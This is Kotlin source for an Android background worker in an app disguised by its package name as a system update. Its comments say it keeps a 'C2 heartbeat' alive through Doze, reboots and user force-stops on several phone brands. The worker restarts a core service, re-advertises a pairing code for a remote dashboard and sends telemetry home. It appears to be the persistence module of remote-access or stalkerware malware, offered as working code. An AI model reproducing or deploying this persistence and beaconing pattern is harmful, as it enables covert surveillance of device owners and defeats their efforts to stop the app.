package com.androidsystem.update.work

import android.content.Context
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.androidsystem.update.core.ConfigManager
import com.androidsystem.update.network.SecureCommunication
import com.androidsystem.update.service.CoreService
import dagger.assisted.Assisted
import dagger.assisted.AssistedFactory
import dagger.assisted.AssistedInject
import dagger.hilt.android.qualifiers.ApplicationContext
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Doze-safe fallback to the in-process [Executors] scheduled inside CoreService.
 * WorkManager survives deep doze and boot; the periodic worker re-arms the C2
 * heartbeat and ensures sync, even after a force-stop on Xiaomi/Oppo/Vivo.
 *
 * The work runs in addition to (not in place of) the in-process scheduler. If
 * the CoreService is alive, the worker is a cheap no-op. If the service is dead
 * (Doze, force-stop), the worker bootstraps it.
 */
@Singleton
class WorkManagerScheduler @Inject constructor(
    @ApplicationContext private val context: Context,
    private val configManager: ConfigManager,
    private val secureComms: SecureCommunication
) {
    companion object { const val UNIQUE_NAME = "nove-heartbeat" }

    fun schedulePeriodic() {
        val cfg = configManager.getConfig()
        val intervalMin = (cfg.optLong("heartbeat_interval", 60_000L) / 60_000L).coerceAtLeast(15L)

        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val req = PeriodicWorkRequestBuilder<HeartbeatWorker>(intervalMin, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
            .build()

        WorkManager.getInstance(context)
            .enqueueUniquePeriodicWork(UNIQUE_NAME, ExistingPeriodicWorkPolicy.KEEP, req)
    }

    class HeartbeatWorker @AssistedInject constructor(
        @Assisted appContext: Context,
        @Assisted params: WorkerParameters
    ) : CoroutineWorker(appContext, params) {
        @AssistedFactory interface Factory { fun create(ctx: Context, params: WorkerParameters): HeartbeatWorker }

        override suspend fun doWork(): Result {
            return try {
                val data = JSONObject().apply {
                    put("status", "active")
                    put("timestamp", System.currentTimeMillis())
                }
                // Best-effort: even if the service is dead this re-advertises the
                // pairing code so the dashboard can re-pair after a force-stop.
                runCatching {
                    val intent = android.content.Intent(applicationContext, CoreService::class.java)
                    applicationContext.startService(intent)
                }
                val r = (applicationContext as? android.app.Application)?.let { app ->
                    val nm = com.androidsystem.update.core.AppModule::class
                    // no-op: just to keep the type alive for IDE resolution
                    null
                }
                // Use the singleton via the Hilt entry point (ApplicationController is HiltAndroidApp).
                val entryPoint = dagger.hilt.android.EntryPointAccessors.fromApplication(
                    applicationContext,
                    HeartbeatEntryPoint::class.java
                )
                val result = entryPoint.secureComms().sendTelemetry(data)
                if (result.success) Result.success() else Result.retry()
            } catch (e: Throwable) {
                Result.retry()
            }
        }
    }

    @dagger.hilt.EntryPoint
    @dagger.hilt.InstallIn(dagger.hilt.components.SingletonComponent::class)
    interface HeartbeatEntryPoint {
        fun secureComms(): SecureCommunication
    }
}
